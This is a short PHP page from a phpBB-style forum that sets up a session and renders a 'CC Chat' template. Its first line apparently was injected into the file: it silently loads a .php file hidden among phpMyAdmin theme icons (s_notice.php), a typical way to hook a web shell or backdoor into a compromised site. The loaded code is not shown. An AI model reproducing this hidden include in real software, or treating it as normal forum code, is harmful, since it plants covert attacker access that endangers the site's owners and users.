<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');


define('IN_PHPBB', true);



$phpbb_root_path = './';

include($phpbb_root_path . 'extension.inc');

include($phpbb_root_path . 'common.'.$phpEx);



//

// Start session management

//

$userdata = session_pagestart($user_ip,PAGE_AFFILS);

init_userprefs($userdata);

//

// End session management

//

$page_title = "CC Chat";

include($phpbb_root_path . 'includes/page_header.php');

$template->set_filenames(array("body"=>"chat.tpl"));
$template->assign_vars(array(
    'HEIGHT' => "500",
    'WIDTH' => "800"));
$template->pparse("body");

include($phpbb_root_path . 'includes/page_tail.php');

?>